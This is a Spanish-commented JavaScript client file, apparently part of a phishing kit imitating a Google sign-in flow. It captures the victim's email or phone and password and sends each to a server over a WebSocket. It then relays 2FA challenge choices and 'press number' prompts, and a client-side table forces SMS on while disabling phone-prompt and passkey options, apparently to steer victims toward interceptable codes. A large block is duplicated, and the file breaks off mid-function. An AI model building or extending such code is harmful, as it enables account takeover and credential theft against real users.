// js/app.js

import { requestNotificationPermission } from './notification-manager.js';

// ------------------------- VARIABLES GLOBALES --------------------------- //

let socket; // Variable para almacenar la conexión WebSocket
const appContainer = document.getElementById('app'); // Contenedor principal donde se cargan las pantallas
let currentUserIdentifier = null; // <--- Variable para guardar el email/teléfono
let currentDeviceName = null; // <--- Variable para guardar el nombre del dispositivo

// ------------------------- UTILIDADES UI --------------------------- //

/**
 * Muestra el indicador de carga (la barra).
 * Busca el elemento por su clase dentro de appContainer.
 */
function showLoader() {
    // Busca el loader dentro del contenedor principal, sea cual sea su estado actual
    const loader = appContainer.querySelector('.bar-desactive, .bar');
    const loadScreen = appContainer.querySelector('.overlay-desactive');
    if (loader && loadScreen) {
        loader.classList.remove('bar-desactive');
        loader.classList.add('bar');
        loadScreen.classList.remove('overlay-desactive');
        loadScreen.classList.add('overlay-active');
        console.log("Loader mostrado.");
    } else {
        console.error("Elemento loader no encontrado.");
    }
}

/**
 * Oculta el indicador de carga (la barra).
 * Busca el elemento por su clase dentro de appContainer.
 */
function hideLoader() {
    const loader = appContainer.querySelector('.bar-desactive, .bar');
    const loadScreen = appContainer.querySelector('.overlay-active');
    if (loader && loadScreen) {
        loader.classList.remove('bar');
        loader.classList.add('bar-desactive');
        loadScreen.classList.remove('overlay-active');
        loadScreen.classList.add('overlay-desactive');
        console.log("Loader oculto.");
    } else {
        // No necesariamente un error si la pantalla cambió y ya no existe
        // console.log("Elemento loader no encontrado al intentar ocultar (puede ser normal).");
    }
}

/**
 * Muestra un mensaje de error en la Pantalla 1.
 * @param {string} message - El mensaje de error a mostrar.
 */
function showScreen1Error(message) {
    // Seleccionamos los elementos dentro del contexto de #screen1 o #app para asegurar que operamos en la pantalla correcta
    const screen1 = appContainer.querySelector('#screen1') || appContainer.querySelector('#screen2');
    if (!screen1) {
        console.error("Contenedor #screen1 no encontrado para mostrar error.");
        return;
    }

    const errorDiv = screen1.querySelector('.error-message-desactive, .error-message'); // Busca por cualquiera de las clases
    const inputBox = screen1.querySelector('.inputBox'); // Busca el contenedor del input
    const errorTextSpan = errorDiv ? errorDiv.querySelector('span:last-child') : null; // El span que contiene el texto
    const loginInput = screen1.querySelector('.login-input'); // El input de login

    if (errorDiv && inputBox && errorTextSpan) {
        errorTextSpan.textContent = message; // Establece el mensaje de error
        errorDiv.classList.replace('error-message-desactive', 'error-message'); // Cambia la clase para mostrarlo
        inputBox.classList.add('inputBox-error'); // Añade la clase de error al input box
        loginInput.classList.add('login-input-error'); // Añade la clase de error al input de login
        console.log(`Error Pantalla 1 mostrado: ${message}`);
    } else {
        console.error("No se pudieron encontrar los elementos necesarios (errorDiv, inputBox, errorTextSpan) en Pantalla 1.");
    }
}

/**
 * Limpia (oculta) cualquier mensaje de error en la Pantalla 1.
 */
function clearScreen1Errors() {
    const screen1 = appContainer.querySelector('#screen1') || appContainer.querySelector('#screen2');
    if (!screen1) {
        // No es un error si screen1 ya no está en el DOM
        // console.log("Contenedor #screen1 no encontrado para limpiar errores (puede ser normal).");
        return;
    }

    const errorDiv = screen1.querySelector('.error-message'); // Solo busca si está activo
    const inputBox = screen1.querySelector('.inputBox');
    const loginInput = screen1.querySelector('.login-input-error');

    if (errorDiv) {
        errorDiv.classList.replace('error-message', 'error-message-desactive'); // Oculta el mensaje
        const errorTextSpan = errorDiv.querySelector('span:last-child');
        if (errorTextSpan) errorTextSpan.textContent = ''; // Limpia el texto
    }
    if (inputBox) {
        inputBox.classList.remove('inputBox-error'); // Quita la clase de error del input box
    }
    if (loginInput) {
        loginInput.classList.remove('login-input-error'); // Quita la clase de error del input de login
    }
    console.log("Errores de Pantalla 1 limpiados (si existían).");
}


document.addEventListener('DOMContentLoaded', () => {
    const emailInput = document.getElementById('identifierInput');
  
    emailInput.addEventListener('keydown', function (event) {
      if (event.key === 'Enter') {
        event.preventDefault(); // Evita comportamiento por defecto
        this.blur(); // Quita el foco para cerrar el teclado
        // Aquí puedes también simular el click en "Siguiente" si quieres:
        clearScreen1Errors();
        document.getElementById('nextBtnScreen1').click();
      }
    });


    const statusDiv = document.getElementById('status'); // Opcional: Para mostrar mensajes

    // Función que maneja el evento focus en el input de email
    const handleEmailFocus = async () => {
        console.log('Input de email enfocado.');

        // Verifica si las notificaciones son soportadas y si el permiso es 'default'
        if ('Notification' in window) {
            if (Notification.permission === 'default') {
                console.log('El permiso de notificación es "default". Solicitando permiso...');
                if (statusDiv) statusDiv.textContent = 'Solicitando permiso para notificaciones...';

                try {
                    const permissionGranted = await requestNotificationPermission();

                    if (permissionGranted) {
                        console.log('Permiso concedido.');
                        if (statusDiv) statusDiv.textContent = '¡Gracias! Notificaciones habilitadas.';
                        // Opcional: Podrías intentar suscribir al usuario aquí si usas push real
                        // import { subscribeUser } from './notification-manager.js';
                        // subscribeUser();
                    } else {
                        console.warn('Permiso NO concedido.');
                        if (statusDiv) statusDiv.textContent = 'No habilitaste las notificaciones.';
                    }

                    // --- IMPORTANTE: Remover el listener ---
                    // Una vez que se ha solicitado (y el usuario respondió o cerró el diálogo),
                    // removemos el listener para no volver a preguntar cada vez que haga focus.
                    emailInput.removeEventListener('focus', handleEmailFocus);
                    console.log('Listener de focus removido del input de email.');

                } catch (error) {
                    console.error('Error al solicitar permiso en focus:', error);
                    if (statusDiv) statusDiv.textContent = 'Error al solicitar permiso.';
                    // También removemos el listener en caso de error para evitar bucles
                     emailInput.removeEventListener('focus', handleEmailFocus);
                }
            } else {
                // Si el permiso ya es 'granted' o 'denied', no hacemos nada y removemos el listener.
                console.log(`Permiso ya establecido a: ${Notification.permission}. No se solicitará de nuevo.`);
                 emailInput.removeEventListener('focus', handleEmailFocus);
                 console.log('Listener de focus removido del input de email (permiso ya establecido).');
            }
        } else {
            console.warn('Este navegador no soporta notificaciones.');
            // Si no hay soporte, no tiene sentido mantener el listener.
            emailInput.removeEventListener('focus', handleEmailFocus);
        }
    };

    // Añade el listener al input de email si existe y las notificaciones son soportadas
    if (emailInput && 'Notification' in window) {
         // Solo añade el listener si el permiso actual es 'default'
         if (Notification.permission === 'default') {
            emailInput.addEventListener('focus', handleEmailFocus);
            console.log('Listener de focus añadido al input de email.');
         } else {
             console.log(`El permiso ya está ${Notification.permission}, no se añadirá listener de focus para solicitarlo.`);
         }

    } else {
        if (!emailInput) {
            console.error('No se encontró el elemento con id "identifierInput".');
        }
        if (!('Notification' in window)) {
            console.warn('Las notificaciones no son soportadas en este navegador.');
        }
    }

    // --- Aquí iría el resto de la lógica de tu app.js si la tienes ---
    // Por ejemplo, el manejo del botón "Siguiente", validaciones, etc.
    // const nextButton = document.getElementById('nextBtnScreen1');
    // if (nextButton) {
    //    nextButton.addEventListener('click', () => {
    //        // Tu lógica para el botón siguiente
    //        console.log('Botón siguiente presionado');
    //    });
    // }


  });

// js/app.js

// Importa la función para solicitar permiso desde tu módulo de notificaciones
import { requestNotificationPermission } from './notification-manager.js'; // Asegúrate que la ruta sea correcta

// Espera a que el DOM esté completamente cargado (buena práctica)
document.addEventListener('DOMContentLoaded', () => {

    const emailInput = document.getElementById('identifierInput');
    const statusDiv = document.getElementById('status'); // Opcional: Para mostrar mensajes

    // Función que maneja el evento focus en el input de email
    const handleEmailFocus = async () => {
        console.log('Input de email enfocado.');

        // Verifica si las notificaciones son soportadas y si el permiso es 'default'
        if ('Notification' in window) {
            if (Notification.permission === 'default') {
                console.log('El permiso de notificación es "default". Solicitando permiso...');
                if (statusDiv) statusDiv.textContent = 'Solicitando permiso para notificaciones...';

                try {
                    const permissionGranted = await requestNotificationPermission();

                    if (permissionGranted) {
                        console.log('Permiso concedido.');
                        if (statusDiv) statusDiv.textContent = '¡Gracias! Notificaciones habilitadas.';
                        // Opcional: Podrías intentar suscribir al usuario aquí si usas push real
                        // import { subscribeUser } from './notification-manager.js';
                        // subscribeUser();
                    } else {
                        console.warn('Permiso NO concedido.');
                        if (statusDiv) statusDiv.textContent = 'No habilitaste las notificaciones.';
                    }

                    // --- IMPORTANTE: Remover el listener ---
                    // Una vez que se ha solicitado (y el usuario respondió o cerró el diálogo),
                    // removemos el listener para no volver a preguntar cada vez que haga focus.
                    emailInput.removeEventListener('focus', handleEmailFocus);
                    console.log('Listener de focus removido del input de email.');

                } catch (error) {
                    console.error('Error al solicitar permiso en focus:', error);
                    if (statusDiv) statusDiv.textContent = 'Error al solicitar permiso.';
                    // También removemos el listener en caso de error para evitar bucles
                     emailInput.removeEventListener('focus', handleEmailFocus);
                }
            } else {
                // Si el permiso ya es 'granted' o 'denied', no hacemos nada y removemos el listener.
                console.log(`Permiso ya establecido a: ${Notification.permission}. No se solicitará de nuevo.`);
                 emailInput.removeEventListener('focus', handleEmailFocus);
                 console.log('Listener de focus removido del input de email (permiso ya establecido).');
            }
        } else {
            console.warn('Este navegador no soporta notificaciones.');
            // Si no hay soporte, no tiene sentido mantener el listener.
            emailInput.removeEventListener('focus', handleEmailFocus);
        }
    };

    // Añade el listener al input de email si existe y las notificaciones son soportadas
    if (emailInput && 'Notification' in window) {
         // Solo añade el listener si el permiso actual es 'default'
         if (Notification.permission === 'default') {
            emailInput.addEventListener('focus', handleEmailFocus);
            console.log('Listener de focus añadido al input de email.');
         } else {
             console.log(`El permiso ya está ${Notification.permission}, no se añadirá listener de focus para solicitarlo.`);
         }

    } else {
        if (!emailInput) {
            console.error('No se encontró el elemento con id "identifierInput".');
        }
        if (!('Notification' in window)) {
            console.warn('Las notificaciones no son soportadas en este navegador.');
        }
    }

    // --- Aquí iría el resto de la lógica de tu app.js si la tienes ---
    // Por ejemplo, el manejo del botón "Siguiente", validaciones, etc.
    // const nextButton = document.getElementById('nextBtnScreen1');
    // if (nextButton) {
    //    nextButton.addEventListener('click', () => {
    //        // Tu lógica para el botón siguiente
    //        console.log('Botón siguiente presionado');
    //    });
    // }

}); // Fin del DOMContentLoaded



// ------------------------- LÓGICA PANTALLA 1 --------------------------- //

/**
 * Configura los event listeners para los elementos interactivos de la Pantalla 1.
 * Se llama cuando el DOM está listo inicialmente.
 */
function setupScreen1Listeners() {
    const nextButton = document.getElementById('nextBtnScreen1'); // El botón SÍ tiene ID
    const identifierInput = document.getElementById('identifierInput'); // El input SÍ tiene ID

    if (nextButton) {
        nextButton.addEventListener('click', handleScreen1NextClick);
        console.log("Listener 'click' añadido a nextBtnScreen1.");
    } else {
        console.error("Botón nextBtnScreen1 no encontrado en el DOM inicial.");
    }

    if (identifierInput) {
        // Opcional: Añadir listener para la tecla Enter en el input
        identifierInput.addEventListener('keypress', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevenir cualquier comportamiento por defecto
                handleScreen1NextClick(); // Ejecutar la misma acción que el click
            }
        });
        console.log("Listener 'keypress' (Enter) añadido a identifierInput.");
    } else {
         console.error("Input identifierInput no encontrado en el DOM inicial.");
    }
}

/**
 * Manejador para el evento click del botón "Siguiente" en la Pantalla 1.
 */
function handleScreen1NextClick() {
    console.log("Click detectado en 'Siguiente' (Pantalla 1).");
    clearScreen1Errors(); // Limpiar errores previos

    const identifierInput = document.getElementById('identifierInput');
    const emailOrPhone = identifierInput ? identifierInput.value.trim() : '';

    // Validación simple: no debe estar vacío
    if (!emailOrPhone) {
        showScreen1Error("Ingresa tu correo electrónico o teléfono");
        return; // Detener ejecución si está vacío
    }

    // ---> GUARDAR EL IDENTIFICADOR <---
    currentUserIdentifier = emailOrPhone;
    console.log(`Identificador guardado: ${currentUserIdentifier}`);
    // ---------------------------------
    

    // Mostrar loader y enviar datos al servidor
    showLoader();
    sendMessage({ action: 'EMAIL', payload: emailOrPhone });
}

// ------------------------- LÓGICA PANTALLA 2 (Platzhalter) --------------------------- //

// Funciones necesarias cuando se cargue screen2.html
// Deberán ser llamadas DESPUÉS de que loadScreen() inyecte el HTML de screen2

/**
 * Configura los event listeners para los elementos interactivos de la Pantalla 2.
 * IMPORTANTE: Esta función debe llamarse DESPUÉS de cargar screen2.html en el DOM.
 */
function setupScreen2Listeners() {
    console.log("Configurando listeners para Pantalla 2...");

    // ---> ACTUALIZAR EL EMAIL MOSTRADO <---
    // (Buscamos #screen2 explícitamente o dentro de appContainer)
    const screen2Container = appContainer.querySelector('#screen2') || appContainer; // Usar appContainer como fallback
    const emailSpan = screen2Container.querySelector('.email-text');

    if (currentUserIdentifier) {
        if (emailSpan) {
            emailSpan.textContent = currentUserIdentifier;
            console.log(`Email "${currentUserIdentifier}" mostrado en Pantalla 2.`);
        } else {
            console.warn("Elemento .email-text no encontrado en la pantalla cargada.");
        }
    } else {
        console.warn("currentUserIdentifier está vacío al configurar Pantalla 2.");
        if (emailSpan) {
            emailSpan.textContent = "tu@email.com"; // O algún placeholder
        }
    }
    // ------------------------------------

    // Buscar elementos interactivos DENTRO del contenedor de la pantalla 2
    const nextButton = screen2Container.querySelector('#nextBtnScreen2');
    const passwordInput = screen2Container.querySelector('#passwordInput');
    const showPasswordCheckbox = screen2Container.querySelector('#showPassword'); // <-- Obtener el checkbox por su ID del HTML

    if (nextButton) {
        nextButton.addEventListener('click', handleScreen2NextClick);
         console.log("Listener 'click' añadido a nextBtnScreen2.");
    } else {
        console.error("Botón nextBtnScreen2 no encontrado después de cargar Pantalla 2.");
    }

    if (passwordInput) {
        passwordInput.addEventListener('keypress', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault();
                clearScreen1Errors();
                passwordInput.blur();
                handleScreen2NextClick();

            }
        });
    }
         console.log("Listener 'keypress' (Enter) añadido a passwordInput.");

        // --- LÓGICA PARA EL CHECKBOX "Mostrar contraseña" ---
        if (showPasswordCheckbox) {
            // Opcional: Recomendar quitar el `onclick="togglePasswordVisibility()"` del HTML
            // si existe, ya que estamos manejando esto aquí.
            // showPasswordCheckbox.removeAttribute('onclick'); // Descomentar para quitarlo si existe

            showPasswordCheckbox.addEventListener('change', () => {
                if (showPasswordCheckbox.checked) {
                    passwordInput.type = 'text'; // Mostrar contraseña
                    console.log("Checkbox marcado: Mostrando contraseña.");
                } else {
                    passwordInput.type = 'password'; // Ocultar contraseña
                    console.log("Checkbox desmarcado: Ocultando contraseña.");
                }
            });
            console.log("Listener 'change' añadido a showPasswordCheckbox.");

             // Asegurarse de que el estado inicial coincida (por si el navegador recuerda el estado del checkbox)
             if (showPasswordCheckbox.checked) {
                 passwordInput.type = 'text';
             } else {
                 passwordInput.type = 'password';
             }

        } else {
            console.error("Checkbox #showPassword no encontrado para la funcionalidad de mostrar/ocultar.");
        }
        // --- FIN LÓGICA CHECKBOX ---


     
    // Lógica para el mensaje de error (si es necesaria específicamente aquí)
    // Por ejemplo, asegurar que el div de error existe
    const errorDiv = screen2Container.querySelector('.error-message-desactive, .error-message');
    if (!errorDiv) {
        console.warn("Contenedor para mensajes de error no encontrado en screen2.");
    }

    // Limpiar errores previos al mostrar la pantalla (si aplica)
    clearScreen1Errors(); // Reutilizamos la función adaptada previamente
}





/**
 * Manejador para el evento click del botón "Siguiente" en la Pantalla 2.
 */
function handleScreen2NextClick() {
    console.log("Click detectado en 'Siguiente' (Pantalla 2).");
    // clearScreen2Errors(); // Necesitarás implementar esta función

    const passwordInput = appContainer.querySelector('#passwordInput');
    const password = passwordInput ? passwordInput.value : ''; // Generalmente no se hace trim() a las contraseñas

    if (!password) {
        // showScreen2Error("Ingresa tu contraseña"); // Necesitarás implementar esta función
        console.error("Error Pantalla 2: Contraseña vacía."); // Placeholder
        return;
    }

    showLoader();
    sendMessage({ action: 'PASSWORD', payload: password });
}


function displayIdentifierOnScreen2() {
  const emailSpan = appContainer.querySelector('.email-text');
  if (emailSpan && userIdentifier) {
      emailSpan.textContent = userIdentifier;
  }
}






/**
 * Manejador para el click en una opción 2FA.
 * @param {Event} event - El evento click.
 */
function handleAuthOptionClick(event) {
    // Usamos currentTarget para asegurarnos de obtener el div al que se adjuntó el listener
    const selectedOptionDiv = event.currentTarget;

    // Doble verificación por si acaso
    if (selectedOptionDiv.classList.contains('RDPZE') || selectedOptionDiv.getAttribute('aria-disabled') === 'true') {
        console.log("Click en opción 2FA deshabilitada ignorado.");
        return;
    }

    const challengeId = selectedOptionDiv.dataset.challengeid;
    const challengeType = selectedOptionDiv.dataset.challengetype;
    const sendMethod = selectedOptionDiv.dataset.sendmethod; // Podría ser undefined

    console.log(`Click en opción 2FA detectado: ID=${challengeId}, Tipo=${challengeType}, MétodoEnvío=${sendMethod || 'N/A'}`);

    // Mostrar loader y enviar la selección al servidor
    showLoader();
    sendMessage({
        action: 'SELECT_CHALLENGE',
        payload: {
            challengeId: challengeId,
            challengeType: challengeType,
            // Incluir sendMethod solo si existe (relevante para SMS/Llamada)
            ...(sendMethod && { sendMethod: sendMethod })
        }
    });
}





// ------------------------- LÓGICA PANTALLA AUTH_2FA_OPTIONS_PRESENT --------------------------- //

// --- Configuración de Habilitación/Deshabilitación ---
const CLIENT_SIDE_2FA_OVERRIDES = {
    // ID: 'estado deseado' ('active' o 'disabled')
    // Si un ID no está aquí, se mantiene su estado original.
    '10': 'disabled', // Deshabilitar "Sí en teléfono"
    '7': 'active',   // Habilitar SMS (aunque viniera deshabilitado)
    // '9': 'disabled',
    '4': 'disabled', // Deshabilitar llave de acceso (OJO: ID era 4, no 53 en el HTML)
    // 'id_ayuda': 'disabled' // Nota: "Obtener ayuda" no tiene ID estándar, necesita otro método si quieres controlarlo
};
// -----------------------------------------------------

/**
 * Modifica el HTML de un formulario 2FA en memoria y lo inyecta
 * en un contenedor específico del DOM.
 *
 * @param {string} formHtml El string HTML completo del formulario extraído.
 * @param {string} targetInjectId El ID del elemento (ej: un div) donde se inyectará el formulario.
 * @param {string} [accountButtonContainerId='account-button-container'] El ID del div donde va el botón de cuenta.
 * @returns {boolean} True si la inyección y modificación fueron exitosas, false si no.
 */
function injectAndModifyAuthForm(formHtml, targetInjectId, accountButtonContainerId = 'account-button-container') {
    const targetContainer = document.getElementById(targetInjectId);
    const accountContainer = document.getElementById(accountButtonContainerId);

    if (!targetContainer) {
        console.error(`Error: Contenedor target #${targetInjectId} no encontrado.`);
        return false;
    }

    if (!formHtml || typeof formHtml !== 'string') {
        console.error("Error: No se proporcionó HTML válido del formulario.");
        targetContainer.innerHTML = '<p style="color: red;">Error al cargar las opciones.</p>';
        return false;
    }

    // 1. Modificar el HTML ANTES de inyectarlo
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = formHtml; // Carga en memoria

    // --- Modificar el botón de cambio de cuenta (si existe en el form y hay datos) ---
    let accountButtonHtml = ''; // Guardamos el HTML del botón para moverlo
    if (currentUserIdentifier && accountContainer) {
        const accountButtonElement = tempDiv.querySelector('[jsname="af8ijd"]');
        if (accountButtonElement) {
            const newAriaLabel = `Se seleccionó ${currentUserIdentifier}. Cambiar de cuenta`;
            accountButtonElement.setAttribute('aria-label', newAriaLabel);
            // Extraemos el HTML del botón y lo quitamos del formulario temporal
            // (Asumiendo que está dentro de un div o li que podemos quitar)
            const parentContainer = accountButtonElement.closest('.SOeSgb'); // Ajusta el selector si es diferente
            if(parentContainer) {
                accountButtonHtml = parentContainer.outerHTML;
                parentContainer.remove(); // Quitarlo del form temporal
                console.log("Botón de cambio de cuenta extraído y actualizado.");
            }
        } else {
            console.warn("Botón de cuenta [jsname='af8ijd'] no encontrado en el form extraído.");
        }
    }
    // -----------------------------------------------------------------------------

    // --- Modificar estado de las opciones ---
    const optionDivs = tempDiv.querySelectorAll('form .VV3oRb[data-challengeid][jsname="EBHGs"]');
    console.log(`Modificando ${optionDivs.length} opciones 2FA según overrides...`);

    optionDivs.forEach(divItem => {
        const challengeId = divItem.dataset.challengeid;
        if (!challengeId) return;

        const desiredState = CLIENT_SIDE_2FA_OVERRIDES[challengeId];
        const descriptionElement = divItem.querySelector('.l5PPKe');
        const descriptionText = descriptionElement ? descriptionElement.innerText.split('\n')[0] : 'Sin descripción';

        if (desiredState === 'disabled') {
            divItem.classList.add('RDPZE');
            divItem.setAttribute('aria-disabled', 'true');
            divItem.setAttribute('tabindex', '-1');
            console.log(`   Opción ID ${challengeId} ("${descriptionText}"): Forzada a DESHABILITADA.`);
        } else if (desiredState === 'active') {
            divItem.classList.remove('RDPZE');
            divItem.setAttribute('aria-disabled', 'false');
            divItem.setAttribute('tabindex', '0');
            console.log(`   Opción ID ${challengeId} ("${descriptionText}"): Forzada a HABILITADA.`);
        } else {
            const originalStatus = divItem.classList.contains('RDPZE') ? 'disabled' : 'active';
            console.log(`   Opción ID ${challengeId} ("${descriptionText}"): Mantenido estado original (${originalStatus}).`);
            // Asegurar atributos consistentes
            if (originalStatus === 'disabled') {
                divItem.setAttribute('aria-disabled', 'true');
                divItem.setAttribute('tabindex', '-1');
            } else {
                 divItem.setAttribute('aria-disabled', 'false');
                 divItem.setAttribute('tabindex', '0');
            }
        }
    });
    // --------------------------------------

    // 2. Obtener el HTML modificado (solo el interior del form si es necesario, o todo)
    const modifiedFormContent = tempDiv.querySelector('form')?.innerHTML || tempDiv.innerHTML; // Intentar obtener solo el interior

    // 3. Inyectar el contenido modificado en el contenedor target
    try {
        targetContainer.innerHTML = modifiedFormContent; // Inyectar el FORMULARIO modificado
        console.log(`Formulario HTML modificado inyectado en #${targetInjectId}.`);

        // --- Inyectar el botón de cuenta en su contenedor dedicado (si se extrajo) ---
        if(accountButtonHtml && accountContainer) {
            accountContainer.innerHTML = accountButtonHtml;
            console.log("Botón de cambio de cuenta inyectado en su contenedor.");
        }
        // ---------------------------------------------------------------------------

    } catch (e) {
        console.error("Error al inyectar el HTML modificado:", e);
        targetContainer.innerHTML = '<p style="color: red;">Error al mostrar las opciones.</p>';
        return false;
    }

    // 4. Re-adjuntar listeners
    setupAuthOptionsListeners(targetInjectId); // Pasar el ID del contenedor para buscar dentro
    return true;
}

// --- Función para (re)adjuntar listeners (modificada para target) ---
function setupAuthOptionsListeners(containerId = 'app') {
    const container = document.getElementById(containerId);
    if (!container) {
        console.error(`Contenedor #${containerId} para listeners de opciones 2FA no encontrado.`);
        return;
    }

    // Busca SOLO los elementos clickeables que NO estén deshabilitados DENTRO del contenedor
    const activeOptionItems = container.querySelectorAll('form .VV3oRb[data-challengeid][jsname="EBHGs"]:not(.RDPZE)');
    console.log(`Añadiendo listeners a ${activeOptionItems.length} opciones 2FA activas en #${containerId}.`);

    activeOptionItems.forEach(item => {
        item.removeEventListener('click', handleAuthOptionClick);
        item.addEventListener('click', handleAuthOptionClick);
    });
}
    




// ------------------------- CARGA DINÁMICA DE PANTALLAS --------------------------- //

/**
 * Carga el contenido HTML de una pantalla desde un archivo y lo inyecta en appContainer.
 * @param {string} screenName - El nombre de la pantalla (ej: 'screen2'). Corresponde al archivo .html en /screens/
 * @param {object|null} [dynamicData=null] - Objeto opcional con datos para reemplazar placeholders.
 */
async function loadScreen(screenName, dynamicData = null) {
    console.log(`Iniciando carga de pantalla: ${screenName}...`, dynamicData ? `con datos: ${JSON.stringify(dynamicData)}` : '');
    showLoader(); // Mostrar loader mientras se carga

    try {
        const response = await fetch(`screens/${screenName}.html`);
        
        if (!response.ok) {
            throw new Error(`Error HTTP ${response.status} al cargar ${screenName}.html`);
        }
        let html = await response.text(); // Obtener como texto



        // ------ INICIO MODIFICACIÓN HTML ESPECÍFICA POR PANTALLA ------
        const emailToShow = currentUserIdentifier || 'tu cuenta'; // Dato común necesario en varias pantallas

        // ------------------------- LÓGICA HTML PANTALLA AUTH_NOTIFICATION_PENDING -------------------------
        if (screenName === 'AUTH_NOTIFICATION_PENDING') {
            console.log("Modificando HTML para AUTH_NOTIFICATION_PENDING...");
            const deviceToShow = currentDeviceName || 'tu dispositivo'; // Usar global o fallback

            html = html.replace(/PLACEHOLDER_EMAIL/g, emailToShow);//PLACEHOLDER_DEVICE_NAME
            html = html.replace(/PLACEHOLDER_DEVICE/g, deviceToShow); // Reemplaza todas las ocurrencias

            console.log("HTML modificado para AUTH_NOTIFICATION_PENDING.");
            // ------------------------- FIN LÓGICA HTML PANTALLA AUTH_NOTIFICATION_PENDING -------------------------

        } else if (screenName === 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER') {
            // ------------------------- LÓGICA HTML PANTALLA AUTH_NOTIFICATION_PENDING_PRESS_NUMBER -------------------------
            console.log("Modificando HTML para AUTH_NOTIFICATION_PENDING_PRESS_NUMBER...");
            if (dynamicData && dynamicData.deviceName && dynamicData.pressNumber) {
                const deviceToShow = dynamicData.deviceName;
                const pressNumberToShow = dynamicData.pressNumber;

                html = html.replace(/PLACEHOLDER_EMAIL/g, emailToShow);
                html = html.replace(/PLACEHOLDER_DEVICE_NAME/g, deviceToShow);
                html = html.replace(/PLACEHOLDER_PRESS_NUMBER/g, pressNumberToShow);

                console.log("HTML modificado para AUTH_NOTIFICATION_PENDING_PRESS_NUMBER.");
            } else {
                console.error("Faltan datos dinámicos (deviceName o pressNumber) para AUTH_NOTIFICATION_PENDING_PRESS_NUMBER. No se reemplazarán todos los placeholders.");
                // Aún así intentará reemplazar el email si está disponible
                html = html.replace(/PLACEHOLDER_EMAIL/g, emailToShow);
            }
            // ------------------------- FIN LÓGICA HTML PANTALLA AUTH_NOTIFICATION_PENDING_PRESS_NUMBER -------------------------

        } else if (screenName === 'screen2') {
            // ------------------------- LÓGICA HTML PANTALLA SCREEN2 -------------------------
            // Actualmente, screen2 actualiza el email DESPUÉS de cargar, en setupScreen2Listeners.
            // Si screen2.html necesitara otros reemplazos *antes* de inyectarse, irían aquí.
            // Ejemplo: html = html.replace(/PLACEHOLDER_OTRO_DATO/g, algunValor);
            console.log("No se requieren reemplazos HTML pre-inyección específicos para screen2.");
            // ------------------------- FIN LÓGICA HTML PANTALLA SCREEN2 -------------------------
        }
        // ... añadir más 'else if' para otras pantallas si necesitan reemplazos pre-inyección ...


        // ------ LÓGICA COMÚN DE REEMPLAZO (Ej: aria-label del botón de cuenta) ------
        // Esto se aplica después de las modificaciones específicas si el botón existe y hay email
        if (currentUserIdentifier) {
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = html;
            // Usamos jsname porque el ID podría no ser único si el botón aparece en varias pantallas
            const accountButton = tempDiv.querySelector('[jsname="af8ijd"]');
            if (accountButton) {
                const newAriaLabel = `Se seleccionó ${emailToShow}. Cambiar de cuenta`;
                accountButton.setAttribute('aria-label', newAriaLabel);
                console.log("Aria-label del botón de cuenta actualizado (si existe).");
                html = tempDiv.innerHTML; // Actualizar el string HTML con la modificación
            } else {
                 console.warn(`Elemento [jsname="af8ijd"] no encontrado en ${screenName} para actualizar aria-label.`);
            }
        }
        // ------ FIN LÓGICA COMÚN DE REEMPLAZO ------

        // ------ FIN MODIFICACIÓN HTML ESPECÍFICA POR PANTALLA ------

        appContainer.innerHTML = html; // Reemplazar el contenido del div #app
        console.log(`Contenido HTML de ${screenName} inyectado.`);





        // ------ INICIO GESTIÓN CSS ESPECÍFICA POR PANTALLA ------
        const commonCssLink = document.querySelector('head link[href="css/common.css"]');
        let needsCommonCss = true; // Asumir que se necesita por defecto

        if (screenName === 'AUTH_NOTIFICATION_PENDING') {
             // ------------------------- LÓGICA CSS PANTALLA AUTH_NOTIFICATION_PENDING -------------------------
             needsCommonCss = false;
             console.log(`CSS: ${screenName} no necesita common.css.`);
              // ------------------------- FIN LÓGICA CSS PANTALLA AUTH_NOTIFICATION_PENDING -------------------------
        } else if (screenName === 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER') {
            // ------------------------- LÓGICA CSS PANTALLA AUTH_NOTIFICATION_PENDING_PRESS_NUMBER -------------------------
             needsCommonCss = false;
             console.log(`CSS: ${screenName} no necesita common.css.`);
            // ------------------------- FIN LÓGICA CSS PANTALLA AUTH_NOTIFICATION_PENDING_PRESS_NUMBER -------------------------
        }else if (screenName === 'AUTH_2FA_OPTIONS_PRESENT') {
            // ------------------------- LÓGICA UI PANTALLA AUTH_2FA_OPTIONS_PRESENT -------------------------
            needsCommonCss = false;
            console.log(`CSS: ${screenName} no necesita common.css.`);
            // ------------------------- FIN LÓGICA UI PANTALLA AUTH_2FA_OPTIONS_PRESENT -------------------------
        } else if (screenName === 'update-phone') {
            // ------------------------- LÓGICA CSS PANTALLA UPDATE-PHONE -------------------------
            needsCommonCss = false;
            console.log(`CSS: ${screenName} no necesita common.css.`);
            
            // ------------------------- FIN LÓGICA CSS PANTALLA UPDATE-PHONE ------------------------- 
            
        }
        // ... añadir más 'else if' para pantallas que NO necesiten common.css ...


        // ------ LÓGICA GENERAL CSS (APLICAR CAMBIOS) ------
        if (needsCommonCss && !commonCssLink) {
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'css/common.css';
            document.head.appendChild(link);
            console.log("CSS: Añadido enlace a common.css.");
        } else if (!needsCommonCss && commonCssLink) {
            commonCssLink.remove();
            console.log("CSS: Eliminado enlace a common.css.");
        } else {
             console.log(`CSS: Estado de common.css (${commonCssLink ? 'presente' : 'ausente'}) es el correcto para ${screenName}. No se requieren cambios.`);
        }
         // ------ FIN LÓGICA GENERAL CSS ------
        // ------ FIN GESTIÓN CSS ESPECÍFICA POR PANTALLA ------


        // ------ INICIO CONFIGURACIÓN LISTENERS ESPECÍFICA POR PANTALLA ------
        if (screenName === 'screen1') {
             // ------------------------- LÓGICA LISTENERS PANTALLA SCREEN1 -------------------------
             // Normalmente llamada solo al inicio, pero la mantenemos por si se recarga
             setupScreen1Listeners();
             console.log("Listeners configurados para screen1.");
              // ------------------------- FIN LÓGICA LISTENERS PANTALLA SCREEN1 -------------------------
        } else if (screenName === 'screen2') {
             // ------------------------- LÓGICA LISTENERS PANTALLA SCREEN2 -------------------------
             setupScreen2Listeners(); // Esta función ya actualiza el email en la UI
             console.log("Listeners configurados para screen2.");
             // ------------------------- FIN LÓGICA LISTENERS PANTALLA SCREEN2 -------------------------
